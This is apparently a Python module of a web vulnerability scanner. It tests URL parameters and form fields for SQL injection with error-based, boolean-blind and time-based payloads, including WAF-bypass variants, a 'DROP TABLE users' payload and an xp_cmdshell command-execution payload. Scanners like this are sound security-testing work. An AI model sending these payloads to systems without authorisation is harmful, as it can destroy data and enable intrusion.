"""SQL Injection scanner — DB-specific error patterns + WAF bypass payloads."""
import re
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from app.scanner.crawler import CrawledPage
from app.scanner.http_client import HttpClient
from app.scanner.modules.base import BaseModule, Finding
from app.scanner.modules.registry import ModuleRegistry

# ── DB-specific error signatures ─────────────────────────────────────────────
SQL_ERRORS: list[tuple[re.Pattern, str]] = [
    # MySQL / MariaDB
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning.*mysql", re.I), "MySQL"),
    (re.compile(r"SQL syntax.*MySQL", re.I), "MySQL"),
    (re.compile(r"valid MySQL result", re.I), "MySQL"),
    (re.compile(r"MySqlClient\.", re.I), "MySQL"),
    (re.compile(r"com\.mysql\.jdbc\.exceptions", re.I), "MySQL"),
    (re.compile(r"Caused by: com\.mysql\.", re.I), "MySQL"),
    # PostgreSQL
    (re.compile(r"PostgreSQL.*ERROR", re.I), "PostgreSQL"),
    (re.compile(r"Npgsql\.PostgresException", re.I), "PostgreSQL"),
    (re.compile(r"pg_query\(\)", re.I), "PostgreSQL"),
    (re.compile(r"ERROR:\s+syntax error at or near", re.I), "PostgreSQL"),
    (re.compile(r"org\.postgresql\.util\.PSQLException", re.I), "PostgreSQL"),
    # MSSQL / SQL Server
    (re.compile(r"microsoft ole db provider for sql server", re.I), "MSSQL"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"Microsoft SQL Server.*Driver", re.I), "MSSQL"),
    (re.compile(r"\bSQLException\b.*\bSQL Server\b", re.I), "MSSQL"),
    (re.compile(r"com\.microsoft\.sqlserver\.jdbc", re.I), "MSSQL"),
    # Oracle
    (re.compile(r"ORA-\d{5}", re.I), "Oracle"),
    (re.compile(r"oracle\.jdbc\.", re.I), "Oracle"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    # SQLite
    (re.compile(r"sqlite3\.OperationalError", re.I), "SQLite"),
    (re.compile(r"SQLite/JDBCDriver", re.I), "SQLite"),
    (re.compile(r"SQLite\.Exception", re.I), "SQLite"),
    (re.compile(r"\[SQLITE_ERROR\]", re.I), "SQLite"),
    # Generic / Other
    (re.compile(r"SQLSTATE\[", re.I), "Generic"),
    (re.compile(r"Syntax error.*SQL", re.I), "Generic"),
    (re.compile(r"supplied argument is not a valid MySQL", re.I), "Generic"),
    (re.compile(r"Column count doesn't match value count", re.I), "Generic"),
]

# ── Error-based payloads ──────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "' OR 1=1--",
    "1' OR '1'='1'--",
    "'; SELECT 1--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1 ORDER BY 1--",
    "1 ORDER BY 100--",    # Column count probe
    "' AND 1=CONVERT(int,@@version)--",  # MSSQL version error
    "' AND extractvalue(1,concat(0x7e,@@version))--",  # MySQL extractvalue error
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

# ── WAF bypass error payloads ────────────────────────────────────────────────
WAF_BYPASS_PAYLOADS = [
    "' /*!OR*/ '1'='1",
    "' OR/**/'1'='1",
    "'%20OR%20'1'='1",
    "' oR '1'='1",          # Case variation
    "%27 OR %271%27=%271",
    "' OR 0x313d31--",      # Hex encoding
    "';%00SELECT 1--",      # Null byte
    "' OR'1'='1",           # No space
    "'+OR+'1'='1",
    "'||'1'='1",            # Oracle-style
    "1' AND 1=1#",          # MySQL comment
    "1' AND 1=1/*",
    "\\'  OR  \\'1\\'=\\'1",  # Escaped quotes
]

# ── Boolean-blind pairs ──────────────────────────────────────────────────────
BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR '1'='1' --", "' OR '1'='2' --"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1 AND 1=1#", "1 AND 1=2#"),
    ("1/**/AND/**/1=1", "1/**/AND/**/1=2"),
]

# ── Time-based blind payloads: (payload, expected_delay_s, db_name) ──────────
TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", 5, "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
    ("' OR pg_sleep(5)--", 5, "PostgreSQL"),
    ("'; SELECT SLEEP(5)--", 5, "MySQL"),
    ("1; EXEC xp_cmdshell('ping -n 6 127.0.0.1')--", 5, "MSSQL"),
    ("'||pg_sleep(5)||'", 5, "PostgreSQL"),
    ("' AND SLEEP(5) AND '1'='1", 5, "MySQL"),
    # WAF bypass time payloads
    ("' OR/**/SLEEP(5)--", 5, "MySQL"),
    ("' OR SLEEP/**/(5)--", 5, "MySQL"),
    ("%27 OR SLEEP(5)--", 5, "MySQL"),
]


@ModuleRegistry.register
class SqliModule(BaseModule):
    name = "sqli"
    description = "Tests for SQL Injection (error-based + WAF bypass + boolean-blind + time-based)"
    scan_modes = ["full"]
    is_active = True

    async def active_test_async(self, page: CrawledPage, http_client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(page.url)
        query_params = parse_qs(parsed.query)

        for param_name in query_params:
            finding = await self._test_param_url(page, param_name, query_params, parsed, http_client)
            if finding:
                findings.append(finding)

        for form in page.forms:
            for inp in form.inputs:
                if not inp.get("name"):
                    continue
                finding = await self._test_param_form(page, form, inp, http_client)
                if finding:
                    findings.append(finding)

        return findings

    async def _test_param_url(self, page, param_name, query_params, parsed, http_client) -> Finding | None:
        # ── Phase 1: Error-based (standard + WAF bypass) ─────────────────────
        all_error_payloads = ERROR_PAYLOADS + WAF_BYPASS_PAYLOADS
        for payload in all_error_payloads:
            test_params = {k: v[0] for k, v in query_params.items()}
            test_params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_params), ""
            ))
            try:
                response = await http_client.get(test_url)
            except Exception:
                continue

            for pattern, db_name in SQL_ERRORS:
                if pattern.search(response.text):
                    return Finding(
                        module_name=self.name,
                        vuln_type=f"SQL Injection - Error Based ({db_name})",
                        severity="critical",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        owasp_category="A03",
                        cwe_id="CWE-89",
                        affected_url=page.url,
                        affected_parameter=param_name,
                        description=(
                            f"SQL error ({db_name}) detected in response when injecting into '{param_name}'. "
                            "The database error message was reflected, confirming SQL injection."
                        ),
                        remediation="Use parameterized queries or prepared statements. Never concatenate user input into SQL strings.",
                        confidence="confirmed",
                        evidence=[
                            {"type": "payload", "title": "Payload", "content": payload},
                            {"type": "request", "title": "Test URL", "content": test_url},
                            {"type": "response", "title": f"{db_name} SQL Error Pattern", "content": pattern.pattern},
                        ],
                    )

        # ── Phase 2: Boolean-blind ────────────────────────────────────────────
        for true_payload, false_payload in BOOLEAN_PAIRS:
            test_true = {k: v[0] for k, v in query_params.items()}
            test_true[param_name] = true_payload
            test_false = {k: v[0] for k, v in query_params.items()}
            test_false[param_name] = false_payload
            url_true = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_true), ""))
            url_false = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_false), ""))
            try:
                resp_true = await http_client.get(url_true)
                resp_false = await http_client.get(url_false)
            except Exception:
                continue

            if resp_true.status_code == 200 and resp_false.status_code not in (200, 400, 404):
                return Finding(
                    module_name=self.name,
                    vuln_type="SQL Injection - Boolean Blind",
                    severity="critical",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    owasp_category="A03",
                    cwe_id="CWE-89",
                    affected_url=page.url,
                    affected_parameter=param_name,
                    description=(
                        f"Boolean-blind SQL injection in '{param_name}'. "
                        "True condition returns HTTP 200; false condition returns different status."
                    ),
                    remediation="Use parameterized queries or prepared statements.",
                    confidence="firm",
                    evidence=[
                        {"type": "payload", "title": "True Condition", "content": f"{true_payload} → HTTP {resp_true.status_code}"},
                        {"type": "payload", "title": "False Condition", "content": f"{false_payload} → HTTP {resp_false.status_code}"},
                    ],
                )

            if (resp_true.status_code == resp_false.status_code == 200
                    and abs(len(resp_true.text) - len(resp_false.text)) > 50):
                return Finding(
                    module_name=self.name,
                    vuln_type="SQL Injection - Boolean Blind (Content Length)",
                    severity="high",
                    cvss_score=8.6,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    owasp_category="A03",
                    cwe_id="CWE-89",
                    affected_url=page.url,
                    affected_parameter=param_name,
                    description=(
                        f"Possible boolean-blind SQLi in '{param_name}'. "
                        "True/false conditions produce significantly different response sizes."
                    ),
                    remediation="Use parameterized queries or prepared statements.",
                    confidence="tentative",
                    evidence=[
                        {"type": "payload", "title": "True Condition", "content": f"{true_payload} → {len(resp_true.text)} bytes"},
                        {"type": "payload", "title": "False Condition", "content": f"{false_payload} → {len(resp_false.text)} bytes"},
                    ],
                )

        # ── Phase 3: Time-based blind ─────────────────────────────────────────
        for payload, expected_delay, db_name in TIME_PAYLOADS:
            test_params = {k: v[0] for k, v in query_params.items()}
            test_params[param_name] = payload
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_params), ""
            ))
            try:
                start = time.monotonic()
                await http_client.get(test_url)
                elapsed = time.monotonic() - start
            except Exception:
                continue

            if elapsed >= expected_delay - 1:
                return Finding(
                    module_name=self.name,
                    vuln_type=f"SQL Injection - Time Based ({db_name})",
                    severity="critical",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    owasp_category="A03",
                    cwe_id="CWE-89",
                    affected_url=page.url,
                    affected_parameter=param_name,
                    description=(
                        f"Time-based blind SQL injection ({db_name}) in '{param_name}'. "
                        f"Response delayed by ~{elapsed:.1f}s."
                    ),
                    remediation="Use parameterized queries. Disable verbose timing responses.",
                    confidence="firm",
                    evidence=[
                        {"type": "payload", "title": "Payload", "content": payload},
                        {"type": "log", "title": "Response Time", "content": f"{elapsed:.2f}s (expected {expected_delay}s delay)"},
                    ],
                )

        return None

    async def _test_param_form(self, page, form, inp, http_client) -> Finding | None:
        all_error_payloads = ERROR_PAYLOADS[:6] + WAF_BYPASS_PAYLOADS[:4]
        for payload in all_error_payloads:
            data = {i["name"]: i.get("value", "test") for i in form.inputs if i.get("name")}
            data[inp["name"]] = payload
            try:
                if form.method == "POST":
                    response = await http_client.post(form.action, data=data)
                else:
                    test_url = f"{form.action}?{urlencode(data)}"
                    response = await http_client.get(test_url)
            except Exception:
                continue

            for pattern, db_name in SQL_ERRORS:
                if pattern.search(response.text):
                    return Finding(
                        module_name=self.name,
                        vuln_type=f"SQL Injection - Error Based ({db_name}, Form)",
                        severity="critical",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        owasp_category="A03",
                        cwe_id="CWE-89",
                        affected_url=form.action,
                        affected_parameter=inp["name"],
                        description=f"SQL error ({db_name}) when injecting into form field '{inp['name']}'.",
                        remediation="Use parameterized queries or prepared statements.",
                        confidence="confirmed",
                        evidence=[
                            {"type": "payload", "title": "Payload", "content": payload},
                            {"type": "response", "title": f"{db_name} SQL Error", "content": pattern.pattern},
                        ],
                    )
        return None
